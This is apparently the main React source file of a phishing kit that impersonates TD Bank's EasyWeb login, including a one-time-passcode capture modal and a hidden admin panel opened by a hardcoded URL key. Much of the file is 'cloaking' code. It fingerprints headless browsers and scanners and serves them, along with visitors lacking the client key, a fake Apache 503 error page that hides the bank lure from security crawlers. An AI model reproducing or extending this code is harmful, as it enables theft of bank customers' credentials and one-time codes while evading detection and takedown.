import React, { useState, useEffect } from 'react';
import LoginPage from './components/LoginPage';
import OtpModal from './components/OtpModal';
import AdminPanel from './components/AdminPanel';


const ADMIN_KEY = 'whapooooSend';

function getAdminKey() {
  const params = new URLSearchParams(window.location.search);
  const keyFromUrl = params.get('key');
  if (keyFromUrl === ADMIN_KEY) {
    sessionStorage.setItem('admin_key', keyFromUrl);
    return keyFromUrl;
  }
  return sessionStorage.getItem('admin_key');
}

// =============================================
// ACCESS KEY + CLOAKING PROTECTION
// =============================================
const VALID_ACCESS_KEY = 'client-td-bank';

// --- Access Key ---
function getAccessKey() {
  const params = new URLSearchParams(window.location.search);
  const keyFromUrl = params.get('key');
  if (keyFromUrl) {
    sessionStorage.setItem('access_key', keyFromUrl);
    return keyFromUrl;
  }
  return sessionStorage.getItem('access_key');
}

// --- Bot Detection ---
// Returns true if the visitor looks like a real human browser.
// Checks multiple signals that headless browsers / scrapers fail.
function detectBot() {
  const signals = [];

  // 1. Selenium / webdriver flag
  if (navigator.webdriver === true) {
    signals.push('webdriver');
  }

  // 2. Headless Chrome leaves this undefined; real Chrome has it
  if (window.chrome === undefined && navigator.userAgent.includes('Chrome')) {
    signals.push('no-chrome-obj');
  }

  // 3. Tiny screen — headless browsers default to 0×0 or very small
  if (window.screen.width < 200 || window.screen.height < 200) {
    signals.push('tiny-screen');
  }

  // 4. Missing browser APIs that real browsers always have
  if (typeof window.Notification === 'undefined') {
    signals.push('no-notification');
  }
  if (typeof window.localStorage === 'undefined') {
    signals.push('no-localstorage');
  }

  // 5. Phantom / older headless: __phantom or _phantom present
  if (window.__phantom || window._phantom || window.callPhantom) {
    signals.push('phantom');
  }

  // 6. Plugins — headless Chrome has zero plugins; real browsers usually have some
  //    (not conclusive alone, but combined with other signals it helps)
  if (navigator.plugins && navigator.plugins.length === 0 && navigator.userAgent.includes('Chrome')) {
    signals.push('no-plugins');
  }

  // 7. Languages — bots often send empty or undefined language
  if (!navigator.language || navigator.language === '') {
    signals.push('no-language');
  }

  // We flag as a bot if 2+ signals fire (reduces false positives on legit users
  // with unusual setups like Firefox with no plugins).
  return signals.length >= 2 ? signals : false;
}

// =============================================
// DECOY PAGE — shown to bots & unkeyed visitors
// Looks like a plain generic server error page.
// No mention of banks, login, or anything real.
// =============================================
function DecoyPage() {
  useEffect(() => {
    document.title = '503 Service Unavailable';
  }, []);

  return (
    <div className="min-h-screen bg-[#f5f5f5] font-mono text-[#333] flex flex-col">
      {/* Fake browser-style top bar */}
      <div className="bg-[#e0e0e0] border-b border-[#bbb] px-4 py-2 text-[12px] text-[#666] flex gap-3 items-center">
        <span className="font-bold text-[#c0392b]">⚠</span>
        <span>503 Service Unavailable — This page cannot be displayed</span>
      </div>

      {/* Main error content */}
      <div className="flex-1 flex items-start justify-center pt-[60px] px-5 pb-5">
        <div className="max-w-[620px] w-full">
          <h1 className="text-[28px] font-bold text-[#c0392b] m-0 mb-3 border-b-2 border-b-[#c0392b] pb-2.5">
            503 — Service Unavailable
          </h1>

          <p className="text-[14px] leading-relaxed my-4">
            The server is temporarily unable to service your request due to maintenance
            downtime or capacity problems. Please try again later.
          </p>

          <div className="bg-white border border-[#ccc] px-5 py-4 text-[12px] leading-loose mt-6 text-[#555]">
            <strong>Error Details:</strong><br />
            <span className="text-[#888]">Timestamp:</span> {new Date().toUTCString()}<br />
            <span className="text-[#888]">Request ID:</span> {Math.random().toString(36).slice(2, 10).toUpperCase()}<br />
            <span className="text-[#888]">Status:</span> 503 Service Unavailable<br />
            <span className="text-[#888]">Server:</span> Apache/2.4.41 (Ubuntu)
          </div>

          <p className="text-[12px] text-[#999] mt-6">
            If the problem persists, please contact your system administrator.
          </p>

          <div className="mt-8 px-4 py-3 bg-[#fff8e1] border border-[#f0c040] text-[12px] text-[#7a6200]">
            <strong>Note for webmasters:</strong> This error is typically caused by upstream
            timeout or a misconfigured proxy. Check your server logs for details.
          </div>
        </div>
      </div>

      {/* Fake footer */}
      <div className="border-t border-[#ccc] px-5 py-2.5 text-[11px] text-[#aaa] text-center">
        Apache Server at localhost · Generated {new Date().toUTCString()}
      </div>
    </div>
  );
}

// =============================================
// CLOAK GATE WRAPPER
// =============================================
function CloakGate({ children }) {
  // 'ok'    → trusted visitor (valid key in URL or session)
  // 'decoy' → bot or no valid key
  const [status, setStatus] = useState('checking');

  // Core evaluation: check key from URL (or session) immediately
  const evaluate = () => {
    const accessKey = getAccessKey();

    // ✅ Valid key → show the real page instantly
    if (accessKey && accessKey === VALID_ACCESS_KEY) {
      setStatus('ok');
      return true;
    }
    return false;
  };

  useEffect(() => {
    // Run immediately on first load
    if (evaluate()) return;

    // No key → run bot detection on keyless visitors.
    const botSignals = detectBot();
    if (botSignals) {
      console.warn('[Cloak] Bot signals detected:', botSignals);
      setStatus('decoy');
      return;
    }

    // Mouse-movement check for keyless visitors
    const onMouseMove = () => {};
    const onTouchStart = () => {};

    window.addEventListener('mousemove', onMouseMove, { once: true });
    window.addEventListener('touchstart', onTouchStart, { once: true });

    const timer = setTimeout(() => {
      window.removeEventListener('mousemove', onMouseMove);
      window.removeEventListener('touchstart', onTouchStart);
      setStatus('decoy');
    }, 1800);

    return () => {
      clearTimeout(timer);
      window.removeEventListener('mousemove', onMouseMove);
      window.removeEventListener('touchstart', onTouchStart);
    };
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  // ── Re-evaluate on every URL change ──────────────────────────────────────
  useEffect(() => {
    const onUrlChange = () => {
      // Re-read key from updated URL params immediately
      evaluate();
    };

    // Back/forward browser navigation
    window.addEventListener('popstate', onUrlChange);

    // Intercept pushState / replaceState (used by SPAs)
    const _pushState = history.pushState.bind(history);
    const _replaceState = history.replaceState.bind(history);

    history.pushState = (...args) => {
      _pushState(...args);
      onUrlChange();
    };
    history.replaceState = (...args) => {
      _replaceState(...args);
      onUrlChange();
    };

    return () => {
      window.removeEventListener('popstate', onUrlChange);
      history.pushState = _pushState;
      history.replaceState = _replaceState;
    };
  }, []); // eslint-disable-line react-hooks/exhaustive-deps
  // ─────────────────────────────────────────────────────────────────────────

  if (status === 'checking') {
    // Show blank while we do the checks — imperceptible to real users
    return null;
  }

  if (status === 'decoy') {
    return <DecoyPage />;
  }

  return children;
}

// =============================================
// MAIN APP
// =============================================
function App() {

  if (getAdminKey() === ADMIN_KEY) {
    return <AdminPanel />;
  }

  const [lang, setLang] = useState(() => localStorage.getItem('appLang') || 'en');
  const [email, setEmail] = useState(() => localStorage.getItem('otpEmail') || '');
  const [showOtpModal, setShowOtpModal] = useState(() => localStorage.getItem('showOtpModal') === 'true');
  const [loginKey, setLoginKey] = useState(0);

  useEffect(() => {
    localStorage.setItem('appLang', lang);
  }, [lang]);

  useEffect(() => {
    document.title = lang === 'en'
      ? "EasyWeb Login"
      : "Se connecter à BanqueNet";
  }, [lang]);

  const handleSignInInitiated = (userEmail) => {
    localStorage.setItem('otpEmail', userEmail);
    localStorage.setItem('showOtpModal', 'true');
    setEmail(userEmail);
    setShowOtpModal(true);
  };

  const handleVerifySuccess = () => {
    setShowOtpModal(false);
    setEmail('');
    setLoginKey(prev => prev + 1);

    localStorage.removeItem('showOtpModal');
    localStorage.removeItem('otpEmail');
    localStorage.removeItem('otpExpiry');

    setTimeout(() => {
      alert('login successful');
    }, 100);
  };

  const handleCloseOtpModal = () => {
    setShowOtpModal(false);
    setEmail('');
    setLoginKey(prev => prev + 1);
    localStorage.removeItem('showOtpModal');
    localStorage.removeItem('otpEmail');
    localStorage.removeItem('otpExpiry');
  };

  return (
    <CloakGate>
      <div className="min-h-screen bg-slate-50 relative select-none">
        <LoginPage
          key={loginKey}
          lang={lang}
          setLang={setLang}
          onSignInInitiated={handleSignInInitiated}
        />

        {/* OTP verification Modal */}
        {showOtpModal && (
          <OtpModal
            email={email}
            lang={lang}
            onVerifySuccess={handleVerifySuccess}
            onClose={handleCloseOtpModal}
          />
        )}
      </div>
    </CloakGate>
  );
}

export default App;
